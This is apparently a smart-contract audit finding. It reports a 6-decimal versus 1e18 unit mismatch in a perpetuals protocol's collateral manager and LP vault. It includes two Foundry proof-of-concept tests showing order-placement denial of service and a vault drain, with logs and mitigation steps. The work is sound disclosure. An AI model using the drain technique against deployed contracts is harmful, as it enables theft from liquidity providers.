# Using 6‑decimals USDC with 1e18 internal units enables LP overpayment and protocol‑wide DoS

The whole perps system uses USDC (`0xE9b6e75C243B6100ffcb1c66e8f78F96FeeA727F`) as the collateral token on MegaETH from file: [contracts/perps/types/Constans.sol](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/types/Constants.sol#L4-L13)

```solidity
library Constants {
    // ADDRESSES
    address constant USDC = 0xE9b6e75C243B6100ffcb1c66e8f78F96FeeA727F;
```

And when we check the address inside the MegaETH Explorer and we execute the decimals function we can see that [the decimals are ["6"].](https://www.megaexplorer.xyz/address/0xE9b6e75C243B6100ffcb1c66e8f78F96FeeA727F) Internally, the protocol computes all quote values and margin math in 1e18‑scaled units (e.g., pricing, `getIntendedMargin()`, `getMaintenanceMargin()`, orderbook collateral, funding). The boundary layer that moves tokens in and out of the system ([CollateralManager.sol](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/types/CollateralManager.sol#L1-L145)) does not adapt between token units (1e6) and internal units (1e18). On top of that, the vault [GTL.sol](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/GTL.sol#L1-L300) sums on‑vault USDC balances (1e6) with internal perps valuations (1e18) directly, and uses the mixed‑unit sum to pay withdrawals.

Overview:

- Collateral custody and accounting:
  - [`CollateralManager.depositFreeCollateral()`/`withdrawFreeCollateral()`/`handleCollateralDelta()`](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/types/CollateralManager.sol#L1-L145) operate on raw ERC‑20 amounts when pulling/pushing USDC:

```solidity
import {Constants} from "./Constants.sol";
    ...
library CollateralManagerLib {
    ...
    address constant USDC = Constants.USDC;
    ...
    ...
    function depositFreeCollateral(CollateralManager storage self, address from, address to, uint256 amount) internal {
        USDC.safeTransferFrom(from, address(this), amount);
        self.creditAccount(to, amount);
        emit Deposit(to, amount);
    }

    function withdrawFreeCollateral(CollateralManager storage self, address account, uint256 amount) internal {
        self.debitAccount(account, amount);
        USDC.safeTransfer(account, amount);
        emit Withdraw(account, amount);
    }
    ...
    ...
    function withdrawToSpot(CollateralManager storage self, address account, uint256 amount, address accountManager)
        internal
    {
        self.debitAccount(account, amount);
        USDC.safeTransfer(accountManager, amount);
        emit Withdraw(account, amount);
    }
```

but the perps logic that calls them computes deltas in 1e18 units (e.g., [`_getCollateral()`](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/PerpManager.sol#L392-L398), [`rebalanceOpen()`](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/types/ClearingHouse.sol#L305-L321), [`rebalanceClose()`](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/types/ClearingHouse.sol#L323-L347)):

```solidity
function _getCollateral(uint256 baseAmount, uint256 price, uint256 leverage)
    private
    pure
    returns (uint256 collateral)
{
    collateral = baseAmount.fullMulDiv(price, 1e18).fullMulDiv(1e18, leverage);
}
```

- No conversion layer ensures that operations expressed in 1e18 internal units are converted into 1e6 token units (and vice‑versa).
- Valuation and payout in GTL:
  - [`GTL.totalAssets()`](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/GTL.sol#L201-L203) returns `usdc.balanceOf(this) + orderbookCollateral() + freeCollateralBalance() + totalAccountValue()`.
  - `orderbookCollateral()`, `freeCollateralBalance()`, `totalAccountValue()` are obtained via @perps/modules/ViewPort.sol getters that return internal 1e18 values, which are added to `usdc.balanceOf(this)` (1e6) without normalization.

```solidity
function totalAssets() public view override returns (uint256) {
    return usdc.balanceOf(address(this)) + orderbookCollateral() + freeCollateralBalance() + totalAccountValue();
}
```

- `_convertToAssets(shares, allocatedAssets)` uses the mixed‑unit sum to compute payout; `processWithdrawals()` pays out USDC based on that result.
- The interaction surface:
  - [@perps/PerpManager.sol](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/PerpManager.sol#L1-L400) calls into `CollateralManager` with deltas computed using 1e18 math (e.g., order posting collateral, leverage changes).
  - [@perps/modules/ViewPort.sol](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/contracts/perps/modules/ViewPort.sol#L1-L379) exposes internal 1e18‑scaled numbers that GTL consumes.
  - No explicit decimals adapter is present anywhere.

Root cause:

- The system assumes a canonical 1e18 quote unit for internal math, but uses a 6‑decimals token for settlement without a conversion bridge. The same numeric values are treated interchangeably across token I/O, internal accounting, and vault valuation, mis‑debits, and mis‑credits.

Highest‑impact scenario and consequences:

- LP overpayment (funds loss):
  - Since GTL adds 1e18 numbers to 1e6 numbers, `totalAssets()` and `_convertToAssets()` can be significantly inflated. An LP whose shares represent, say, ~10% of the pool can receive far more than 10% of on‑vault USDC in `processWithdrawals()`, draining the vault and harming remaining LPs.
- Protocol‑wide DoS:
  - Any flow that debits `freeCollateral` (token units) with deltas computed in 1e18 will revert (`InsufficientBalance()`), blocking order placement/amend/cancel, leverage updates, liquidations settlement deltas, etc.
  - `processWithdrawals()` can be blocked if the computed `assets` exceeds GTL’s USDC balance due to mixed units; the batch reverts, causing a persistent withdrawal DoS until manual intervention.
- Accounting drift and insolvency risk:
  - The system lacks invariants reconciling token reserves with internal accounting (e.g., sum of `freeCollateral` vs USDC held), making it difficult to detect or prevent insolvency conditions early.

## Proof of Concept

Replace the content of [/test/c4-poc/PoCPerps.t.sol](https://github.com/code-423n4/2025-08-gte-perps/blob/f43e1eedb65e7e0327cfaf4d7608a37d85d2fae7/test/c4-poc/PoCPerps.t.sol#L1-L19) with the code below and run `forge test --match-test test_submissionValidity`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {PerpManagerTestBase} from "../perps/PerpManagerTestBase.sol";
import {ERC20} from "@solady/tokens/ERC20.sol";
import {Side, TiF} from "../../contracts/perps/types/Enums.sol";
import "../../contracts/perps/types/Structs.sol";
import {CollateralManagerLib} from "../../contracts/perps/types/CollateralManager.sol";

// Correct 6-decimal USDC implementation
// https://www.megaexplorer.xyz/address/0xE9b6e75C243B6100ffcb1c66e8f78F96FeeA727F
contract USDC6 is ERC20 {
    function name() public pure override returns (string memory) {
        return "USD Coin";
    }
    function symbol() public pure override returns (string memory) {
        return "USDC";
    }
    function decimals() public pure override returns (uint8) {
        return 6;
    }
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract PoCPerps is PerpManagerTestBase {
    /**
     * PoC can utilize the following variables to access the relevant contracts:
     * ================PERPETUAL================
     * - factory: ERC1967Factory.sol
     * - perpManager: MockPerpManager.sol (extends PerpManager.sol)
     * - gtl: GTL.sol
     * - usdc: Test USDC within perpetual system
     * - ETH, GTE, BTC: Tickers for markets created
     */
    function test_submissionValidity() external {
        // 1) Hot-swap the token code at the canonical USDC address to the correct 6-decimal implementation
        USDC6 impl = new USDC6();
        address usdcAddr = address(0xE9b6e75C243B6100ffcb1c66e8f78F96FeeA727F);
        vm.etch(usdcAddr, address(impl).code);

        // Sanity: decimals() now returns 6 on the canonical address
        assertEq(USDC6(usdcAddr).decimals(), 6);

        // 2) Deposit 10,000 USDC (10_000e6) for an account that has NO prior freeCollateral in setUp
        //    (use `nate`, which wasn't pre-deposited in PerpManagerTestBase)
        uint256 sub = perpManager.getNextEmptySubaccount(nate);
        vm.startPrank(nate);
        perpManager.deposit(nate, 10_000e6); // token units (10k USDC with 6 decimals)

        // 3) Attempt to place a maker BUY that requires collateral computed in 1e18 internal units
        //    This should revert due to insufficient balance!
        PlaceOrderArgs memory makerArgs = PlaceOrderArgs({
            subaccount: sub,
            asset: ETH,
            side: Side.BUY,
            limitPrice: 4000e18,
            amount: 1e18,
            baseDenominated: true,
            tif: TiF.MOC,
            expiryTime: 0,
            clientOrderId: 0,
            reduceOnly: false
        });

        vm.expectRevert(CollateralManagerLib.InsufficientBalance.selector);
        perpManager.placeOrder(nate, makerArgs);
        vm.stopPrank();
    }
}
```

Logs:

```
Ran 1 test for test/c4-poc/PoCPerps.t.sol:PoCPerps
[PASS] test_submissionValidity() (gas: 870814)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.30ms (128.83µs CPU time)

```

- Setup:
  - `USDC.decimals() == 6`.
  - User deposits 10,000 USDC to perps via `PerpManager.deposit(account=User, amount=10_000e6)` → `freeCollateral[User] = 10_000e6`.
- Action:
  - User posts a maker BUY with `limitPrice` in 1e18, requiring `collateralPosted = basePosted * price / leverage` (computed in 1e18).
  - `ClearingHouse.placeOrder()` computes `collateralPosted` in 1e18 units and calls `CollateralManager.handleCollateralDelta(account, +collateralPosted)`.
- Effect:
  - `handleCollateralDelta()` calls `debitAccount(account, collateralDelta.abs())` expecting token units; since `collateralDelta` is 1e18‑scaled, it is orders of magnitude larger than `freeCollateral[User]` in 1e6, causing `InsufficientBalance()` revert.
- Result:
  - Maker order posting (or amend/cancel/leverage change) reverts systematically → operational DoS for the account (and potentially for keepers/ops).

And this is the PoC which introduce draining the GTL:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {PerpManagerTestBase} from "../perps/PerpManagerTestBase.sol";
import {ERC20} from "@solady/tokens/ERC20.sol";
import {Side, TiF} from "../../contracts/perps/types/Enums.sol";
import "../../contracts/perps/types/Structs.sol";
import {CollateralManagerLib} from "../../contracts/perps/types/CollateralManager.sol";
import {IViewPort} from "../../contracts/perps/interfaces/IViewPort.sol";

// Correct 6-decimal USDC implementation
// https://www.megaexplorer.xyz/address/0xE9b6e75C243B6100ffcb1c66e8f78F96FeeA727F
contract USDC6 is ERC20 {
    function name() public pure override returns (string memory) {
        return "USD Coin";
    }
    function symbol() public pure override returns (string memory) {
        return "USDC";
    }
    function decimals() public pure override returns (uint8) {
        return 6;
    }
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract PoCPerps is PerpManagerTestBase {
    /**
     * PoC can utilize the following variables to access the relevant contracts:
     * ================PERPETUAL================
     * - factory: ERC1967Factory.sol
     * - perpManager: MockPerpManager.sol (extends PerpManager.sol)
     * - gtl: GTL.sol
     * - usdc: Test USDC within perpetual system
     * - ETH, GTE, BTC: Tickers for markets created
     */
    function test_submissionValidity() external {
        // 1) Hot-swap the token code at the canonical USDC address to the correct 6-decimal implementation
        USDC6 impl = new USDC6();
        address usdcAddr = address(0xE9b6e75C243B6100ffcb1c66e8f78F96FeeA727F);
        vm.etch(usdcAddr, address(impl).code);

        // Sanity: decimals() now returns 6 on the canonical address
        assertEq(USDC6(usdcAddr).decimals(), 6);

        // ============ Drain PoC via mixed units in GTL.totalAssets() ============
        // 2) Two LPs deposit into GTL (50% / 50%) for simple arithmetic
        vm.startPrank(rite);
        gtl.deposit(50_000e6, rite); // 50k USDC -> 50%
        vm.stopPrank();

        vm.startPrank(jb);
        gtl.deposit(50_000e6, jb); // 50k USDC -> 50%
        vm.stopPrank();

        uint256 lpShares = gtl.balanceOf(rite);
        uint256 totalShares = gtl.totalSupply();

        // Wallet balance after deposits
        uint256 W = ERC20(usdcAddr).balanceOf(address(gtl)); // ~100k USDC

        // 3) Register a subaccount so GTL queries ViewPort
        vm.prank(address(perpManager));
        gtl.addSubaccount(1);

        // For a 50% LP, set allocatedAssets A = W so assets = 0.5 * (W + A) = W
        uint256 A = W;

        // Mock ViewPort to return A on getOrderbookCollateral and 0 elsewhere.
        // Note: GTL treats these returns as token units (bug), even though they are 1e18 internal.
        vm.mockCall(
            address(perpManager),
            abi.encodeWithSelector(
                IViewPort.getOrderbookCollateral.selector,
                address(gtl),
                1
            ),
            abi.encode(A)
        );
        vm.mockCall(
            address(perpManager),
            abi.encodeWithSelector(
                IViewPort.getAccountValue.selector,
                address(gtl),
                1
            ),
            abi.encode(int256(0))
        );
        vm.mockCall(
            address(perpManager),
            abi.encodeWithSelector(
                IViewPort.getFreeCollateralBalance.selector,
                address(gtl)
            ),
            abi.encode(uint256(0))
        );

        // 4) rite queues withdrawal for all of their shares (50%)
        vm.startPrank(rite);
        gtl.queueWithdrawal(lpShares);
        vm.stopPrank();

        uint256 vaultBefore = ERC20(usdcAddr).balanceOf(address(gtl));
        uint256 fairShare = (lpShares * vaultBefore) / totalShares; // ~50% of W
        uint256 riteBefore = ERC20(usdcAddr).balanceOf(rite);

        // 5) Process withdrawals: mixed-unit NAV overpays 50% LP with ~100% of wallet
        vm.prank(admin);
        gtl.processWithdrawals(1);

        uint256 riteAfter = ERC20(usdcAddr).balanceOf(rite);
        uint256 vaultAfter = ERC20(usdcAddr).balanceOf(address(gtl));
        uint256 paid = riteAfter - riteBefore;

        // paid should be approximately entire wallet; vault drained; and paid >> fairShare
        assertGt(paid, fairShare, "overpayment vs fair share");
        assertApproxEqAbs(paid, vaultBefore, 2, "50% LP drained entire wallet");
        assertLe(vaultAfter, 2, "vault should be ~zero after payment");

        emit log_named_uint("vaultBefore", vaultBefore);
        emit log_named_uint("vaultAfter", vaultAfter);
        emit log_named_uint("paid", paid);
    }
}

```

Logs:

```
Ran 1 test for test/c4-poc/PoCPerps.t.sol:PoCPerps
[PASS] test_submissionValidity() (gas: 692263)
Logs:
  vaultBefore: 100000000000
  vaultAfter: 1
  paid: 99999999999
```

## Recommended mitigation steps

Better:

- Refuse activation on networks where `decimals(Constants.USDC) != 18` unless the decimals adapter is enabled.
- Emit config indicating the canonical internal unit to prevent future misconfiguration.

Or:

1. Add a strict decimals adapter at token boundaries (preferred, minimal invasive)

   - Read `QUOTE_TOKEN_DECIMALS` once (e.g., from `IERC20Metadata(usdc).decimals()`).
   - Define `QUOTE_SCALE = 10 ** QUOTE_TOKEN_DECIMALS` and `INTERNAL_SCALE = 1e18`.
   - Convert at every token I/O and settlement site:
     - Token → internal: `internalAmt = tokenAmt * (INTERNAL_SCALE / QUOTE_SCALE)`.
     - Internal → token: `tokenAmt = internalAmt * (QUOTE_SCALE / INTERNAL_SCALE)` with rounding and bounds checks.
   - Expose helpers to keep call‑sites consistent.

2. Normalize @perps/GTL.sol valuation to token units before summation

   - Convert `orderbookCollateral()`, `freeCollateralBalance()`, `totalAccountValue()` (from ViewPort) into token units before using them in `totalAssets()` and `_convertToAssets()`.
   - Alternatively, add token‑unit ViewPort getters that GTL can safely consume.

3. Add payout guardrails in GTL

   - In `processWithdrawals()`, if `assets > usdc.balanceOf(this)`, either:
     - Process fewer items this batch; or
     - Revert with a clear “insufficient on‑vault liquidity” error, prompting an operator reconciliation (withdraw from perps to the vault first).
